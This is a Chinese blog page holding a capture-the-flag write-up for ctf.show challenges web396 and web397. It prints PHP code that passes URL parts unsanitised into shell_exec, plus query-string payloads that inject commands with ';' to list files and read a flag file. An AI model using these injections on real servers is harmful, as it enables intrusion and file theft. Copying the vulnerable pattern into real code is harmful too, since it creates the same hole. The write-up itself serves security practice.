<!DOCTYPE html>

<head>
	
	<title>其他 - wanan</title>
	<meta charset="utf-8">
	
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
	
	<meta name="description" content="web396 &lt;?php  &#x2F;* # -*- coding: utf-8 -*-  Author: h1xa  Date:   2021-01-15 16:38:07  Last Modified by:   h1xa  Last Modified time: 2021-01-15 17:20:22  email: h1xa@ctfer.com  link: https:&#x2F;&#x2F;ctfer.co">
<meta property="og:type" content="article">
<meta property="og:title" content="其他">
<meta property="og:url" content="https://lovewanan.github.io/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/index.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="web396 &lt;?php  &#x2F;* # -*- coding: utf-8 -*-  Author: h1xa  Date:   2021-01-15 16:38:07  Last Modified by:   h1xa  Last Modified time: 2021-01-15 17:20:22  email: h1xa@ctfer.com  link: https:&#x2F;&#x2F;ctfer.co">
<meta property="og:locale">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291943011.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291945703.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953344.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953960.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033319.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033697.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312035864.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130131892.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130222833.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130816722.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415132225921.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415133217378.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141929631.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141935770.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415142122553.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415143111800.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415162912608.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163540538.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163659803.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173649654.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173726802.png">
<meta property="article:published_time" content="2022-04-17T14:37:17.293Z">
<meta property="article:modified_time" content="2022-04-18T07:29:08.612Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="ctf.show">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291943011.png">

	<meta name="theme-color" content="#5e72e4">
	<meta name="theme-color-rgb" content="94,114,228">
	<meta name="theme-color-origin" content="#5e72e4">
	<meta name="argon-enable-custom-theme-color" content="true">
	<meta name="theme-card-radius" content="4">
	<meta name="theme-version" content="1.0.2">
	<link rel="icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
	<link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">

	
<link rel="stylesheet" href="/assets/argon_css_merged.css">

	
<link rel="stylesheet" href="/style.css">

	
<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">

	
<script src="/assets/argon_js_merged.js"></script>

	
<script src="/assets/js/argon.min.js"></script>

	
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


	

	<script>
		var argonConfig = {
			language: "zh_CN",
			
				zoomify: {
					duration: 200,
					easing: "cubic-bezier(0.4,0,0,1)",
					scale: 0.9
				},
			
			pangu: "false",
			
				lazyload: {
					threshold: 800,
					effect: "fadeIn"
				},
			
			disable_pjax: false,
			headroom: false
		}
	</script>
	<script>
		var darkmodeAutoSwitch = "false";
		function setDarkmode(enable){
			if (enable == true){
				$("html").addClass("darkmode");
			}else{
				$("html").removeClass("darkmode");
			}
			$(window).trigger("scroll");
		}
		function toggleDarkmode(){
			if ($("html").hasClass("darkmode")){
				setDarkmode(false);
				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
			}else{
				setDarkmode(true);
				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
			}
		}
		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
			setDarkmode(true);
		}
		function toggleDarkmodeByPrefersColorScheme(media){
			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
				return;
			}
			if (media.matches){
				setDarkmode(true);
			}else{
				setDarkmode(false);
			}
		}
		function toggleDarkmodeByTime(){
			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
				return;
			}
			let hour = new Date().getHours();
			if (hour < 7 || hour >= 22){
				setDarkmode(true);
			}else{
				setDarkmode(false);
			}
		}
		if (darkmodeAutoSwitch == 'system'){
			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
		}
		if (darkmodeAutoSwitch == 'time'){
			toggleDarkmodeByTime();
		}
		if (darkmodeAutoSwitch == 'alwayson'){
			setDarkmode(true);
		}

		function toggleAmoledDarkMode(){
			$("html").toggleClass("amoled-dark");
			if ($("html").hasClass("amoled-dark")){
				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
			}else{
				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
			}
		}
		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
			$("html").addClass("amoled-dark");
		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
			$("html").removeClass("amoled-dark");
		}
	</script>
	<script>
		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
			$("html").addClass("using-safari");
		}
	</script>

	
		
<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>

	
<meta name="generator" content="Hexo 6.0.0"></head>



<style id="themecolor_css">
	
	:root{
		--themecolor: #5e72e4;
		--themecolor-dark0: #5368E2;
		--themecolor-dark: #485FE0;
		--themecolor-dark2: #324CDD;
		--themecolor-dark3: #233DD2;
		--themecolor-light: #8A98EB;
		--themecolor-rgbstr: 94,114,228;
		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);

	}
</style>
<style id="theme_cardradius_css">
	:root{
		--card-radius: 4px;
	}
</style>

<body>
<div id="toolbar">
	<header class="header-global">
		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
			<div class="container">
				
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
				<a class="navbar-brand" href="/">wanan</a>
				<div class="navbar-collapse collapse" id="navbar_global">
					<div class="navbar-collapse-header">
						<div class="row">
							<div class="col-6 collapse-brand"></div>
							<div class="col-6 collapse-close">
								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
									<span></span>
									<span></span>
								</button>
							</div>
						</div>
					</div>
					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
							<a class="nav-link nav-link-icon">
								<i class="fa fa-search"></i>
								<span class="nav-link-inner--text d-lg-none">搜索</span>
							</a>
						</li>
					</ul>
					
							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
								
										<li class='nav-item'>
											<a href='/' class='nav-link' >
												<i class='ni ni-book-bookmark d-lg-none'></i>
												<span class='nav-link-inner--text'>首页</span>
											</a>
											
										</li>
									
										<li class='nav-item dropdown'>
											<a href='' class='nav-link' onclick='return false;' data-toggle='dropdown' no-pjax>
												<i class='ni ni-book-bookmark d-lg-none'></i>
												<span class='nav-link-inner--text'>分类</span>
											</a>
											
													<div class="dropdown-menu">
														
															<a href='/categories/ctf/' class='dropdown-item'>ctf</a>
														
															<a href='/categories/ctf/sql%E6%B3%A8%E5%85%A5/' class='dropdown-item'>sql注入</a>
														
															<a href='/categories/java%E7%9F%A5%E8%AF%86/' class='dropdown-item'>java知识</a>
														
															<a href='/categories/ctf/php%E7%9F%A5%E8%AF%86' class='dropdown-item'>php知识</a>
														
															<a href='/categories/BUUCTF' class='dropdown-item'>BUUCTF</a>
														
															<a href='/categories/Linux' class='dropdown-item'>Linux</a>
														
															<a href='/categories/ctfshow' class='dropdown-item'>ctf.show</a>
														
													</div>
												
										</li>
									
							</ul>
						
					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
							<a class="nav-link nav-link-icon">
								<i class="fa fa-search"></i>
								<span class="nav-link-inner--text d-lg-none">搜索</span>
							</a>
						</li>
					</ul>
				</div>
				
				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
			</div>
		</nav>
	</header>
</div>
<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">搜索</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<!-- TODO -->
<div class="form-group mb-3">
	<div class="input-group input-group-alternative">
		<div class="input-group-prepend">
			<span class="input-group-text"><i class="fa fa-search"></i></span>
		</div>
		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
	</div>
	<div id="local-search-result"></div>
</div>

			</div>
		</div>
	</div>
</div>
<!--Banner-->
<section id="banner" class="banner section section-lg section-shaped">
	<div class="shape shape-style-1 shape-primary">
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
	</div>

	
	<div id="banner_container" class="banner-container container text-center">
		
			<div class="banner-title text-white"><span class="banner-title-inner">wanan</span>
		
		</div>
	</div>
	
		<style>
			section.banner{
				background-image: url(/assets/img/banner.jpg) !important;
			}
		</style>
	
</section>


	<style>
		#content:before {
			content: '';
			display: block;
			position: fixed;
			left: 0;
			right: 0;
			top: 0;
			bottom: 0;
			z-index: -2;
			background: url(/assets/img/banner.jpg);
			background-position: center;
			background-size: cover;
			background-repeat: no-repeat;
			opacity: 1;
			transition: opacity .5s ease;
		}
		html.darkmode #content:before{
			filter: brightness(0.65);
		}
		
			#content:after {
				content: '';
				display: block;
				position: fixed;
				left: 0;
				right: 0;
				top: 0;
				bottom: 0;
				z-index: -2;
				background: url(/assets/img/banner.jpg);
				background-position: center;
				background-size: cover;
				background-repeat: no-repeat;
				opacity: 0;
				transition: opacity .5s ease;
			}
			html.darkmode #content:after {
				opacity: 1;
			}
			html.darkmode #content:before {
				opacity: 0;
			}
		
		
			#banner, #banner .shape {
				background: transparent !important;
			}
		
	</style>




<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
	</button>
	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
	</button>
	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" <-% theme.fab_show_gotocomment_button ? "" : "style='display: none;'"  aria-label="Comment" tooltip="评论">
		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
	</button>
	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_darkmode_button ? "" : "style='display: none;'"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
	</button>
	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_settings_button ? "" : "style='display: none;'"  aria-label="Open Blog Settings Menu" tooltip="设置">
		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
	</button>
	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
		<div class="blog-setting-item mt-3">
			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
			<div style="flex: 1;"></div>
			<label id="blog_setting_darkmode_switch" class="custom-toggle">
				<span class="custom-toggle-slider rounded-circle"></span>
			</label>
		</div>
		<div class="blog-setting-item mt-3">
			<div style="flex: 1;">字体</div>
			<div>
				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
			</div>
		</div>
		<div class="blog-setting-item mt-3">
			<div style="flex: 1;">阴影</div>
			<div>
				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
			</div>
		</div>
		<div class="blog-setting-item mt-3 mb-3">
			<div style="flex: 1;">滤镜</div>
			<div id="blog_setting_filters" class="ml-3">
				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
			</div>
		</div>
		<div class="blog-setting-item mb-3">
			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
				<div id="blog_setting_card_radius"></div>
			</div>
		</div>
		
			<div class="blog-setting-item mt-1 mb-3">
				<div style="flex: 1;">主题色</div>
				<div id="theme-color-picker" class="ml-3"></div>
			</div>
		
	</div>
	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
	</button>
	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
		<span id="fabtn_reading_progress_details">0%</span>
	</button>
</div>

<div id="content" class="site-content">


	<script src="https://cdn.jsdelivr.net/npm/@waline/client"></script>



	<script>
		var _hmt = _hmt || [];
		(function() {
		  var hm = document.createElement("script");
		  hm.src = "https://hm.baidu.com/hm.js?853baf6befa4784c85c2f47223a04efb" ;
		  var s = document.getElementsByTagName("script")[0]; 
		  s.parentNode.insertBefore(hm, s);
		})();
		</script>
		






<div class="page-information-card-container">
	
</div>

<div id="sidebar_mask"></div>
<aside id="leftbar" class="leftbar widget-area" role="complementary">
		
		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
			<div class="leftbar-banner card-body">
				<span class="leftbar-banner-title text-white">wanan</span>
				
				
			</div>
			
			
				<ul id='leftbar_part1_menu' class='leftbar-menu'>
					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li>
				</ul>
			
			<div class="card-body text-center leftbar-search-button">
				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
				</button>
			</div>
		</div>
		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
			<div id="leftbar_part2_inner" class="card-body">
				
				<div class="nav-wrapper" style="padding-top: 5px;">
	                <ul class="nav nav-pills nav-fill" role="tablist">
						
							<li class="nav-item sidebar-tab-switcher">
								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
							</li>
						
						<li class="nav-item sidebar-tab-switcher">
							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
						</li>
	                </ul>
				</div>
				<div>
					<div class="tab-content" style="padding: 10px 10px 0 10px;">
						
							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
								<div id="leftbar_catalog"></div>
								<script type="text/javascript">
									$(function () {
										$(document).headIndex({
											articleWrapSelector: '#post_content',
											indexBoxSelector: '#leftbar_catalog',
											subItemBoxClass: "index-subItem-box",
											itemClass: "index-item",
											linkClass: "index-link",
											offset: 80,
										});
									})
								</script>
								
							</div>
						
						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
							<img id="leftbar_overview_author_image" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
							<h6 id="leftbar_overview_author_name">wanan</h6>
							<nav class="site-state">
								<div class="site-state-item site-state-posts">
									<a href="/archives">
										<span class="site-state-item-count">58</span>
										<span class="site-state-item-name">文章</span>
									</a>
								</div>
								<div class="site-state-item site-state-categories">
									<a data-toggle="modal" data-target="#blog_categories">
										<span class="site-state-item-count">7</span>
										<span class="site-state-item-name">分类</span>
									</a>
								</div>      
								<div class="site-state-item site-state-tags">
									<a data-toggle="modal" data-target="#blog_tags">
										<span class="site-state-item-count">7</span>
										<span class="site-state-item-name">标签</span>
									</a>
								</div>
							</nav>
							
									<div class="site-author-links">
										
									</div>
								
							
									<div class='site-friend-links'>
										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
										<ul class='site-friend-links-ul'>
											
												<li class='site-friend-links-item'>
													<a href='https://argon-docs.solstice23.top/#/' rel='noopener' target='_blank'>Argon</a>
												</li>
											
										</ul>
									</div>
								
						</div>
					</div>
				</div>
			</div>
		</div>
</aside>
<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">分类</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<a class="badge badge-secondary tag" href="/categories/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/categories/ctf/" rel="tag">ctf <span class="tag-num">26</span></a><a class="badge badge-secondary tag" href="/categories/ctfshow/" rel="tag">ctfshow <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/categories/java%E7%9F%A5%E8%AF%86/" rel="tag">java知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/php%E7%9F%A5%E8%AF%86/" rel="tag">php知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">2</span></a>
			</div>
		</div>
	</div>
</div>
<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">标签</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<a class="badge badge-secondary tag" href="/tags/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/tags/bugctf/" rel="tag">bugctf <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/tags/ctf-show/" rel="tag">ctf.show <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/xctf/" rel="tag">xctf <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界 <span class="tag-num">9</span></a>
			</div>
		</div>
	</div>
</div>


<div id="primary" class="content-area">
	<main id="main" class="site-main" role="main">
		
		
			
	<article class="post post-full card bg-white shadow-sm border-0 ">
	<header class="post-header text-center">
		
		<a class="post-title" href="/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/">其他</a>
		<div class="post-meta">
			
						
						<div class="post-meta-detail post-meta-detail-time">
							<i class="fa fa-clock-o" aria-hidden="true"></i>
							<time title="发布于 2022-4-17 22:37:17 | 编辑于 2022-4-18 15:29:08">2022-4-17 22:37
							</time>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-categories">
							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
							<a class="post-meta-detail-catagory-link" href="/categories/ctfshow/">ctfshow</a>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-words">
							<i class="fa fa fa-book" aria-hidden="true"></i>
							<span id="busuanzi_container_page_pv">
								阅读<span id="busuanzi_value_page_pv"></span>次
							</span>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-words">
							<i class="fa fa-file-word-o" aria-hidden="true"></i>
							7.5k 字
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-readingtime">
							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
							44 分钟
						</div>
					
		</div>
		
	</header>

	<div class="post-content" id="post_content">
		<h1 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 17:20:22
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);#解析一个url返回关联数组
    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; &#39;.$url[&#39;path&#39;]);#通过shell环境执行命令,并将完整的输出以字符串形式返回 host www.baidu.com path /test/

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<p>简单测试一下发现,通过;可以让shell的命令进行分开执行</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291943011.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220329194307970"></p>

<pre><code>?url=http://1/1; echo `ls` &gt; 1.txt
</code></pre>
<p>接着访问1.txt文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291945703.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220329194559670"></p>

<pre><code>?url=http://www/qqq;cat fl0g.php &gt; 2.txt
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953344.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220329195341272"></p>

<pre><code>?url=http://www/qqq;tac `ls`&gt; 3.txt
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953960.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220329195357904"></p>

<h1 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h1><pre><code class="php"> &lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-01-15 16:38:07
 Last Modified by:   h1xa
 Last Modified time: 2021-01-15 17:49:13
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET[&#39;url&#39;]))&#123;
    $url = parse_url($_GET[&#39;url&#39;]);
    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);

&#125;else&#123;
    highlight_file(__FILE__);
&#125; 
</code></pre>
<p>有一个&#x2F;tmp&#x2F;目录</p>
<pre><code>?url=http://1/1; echo `ls`/../ &gt; 1.txt
</code></pre>
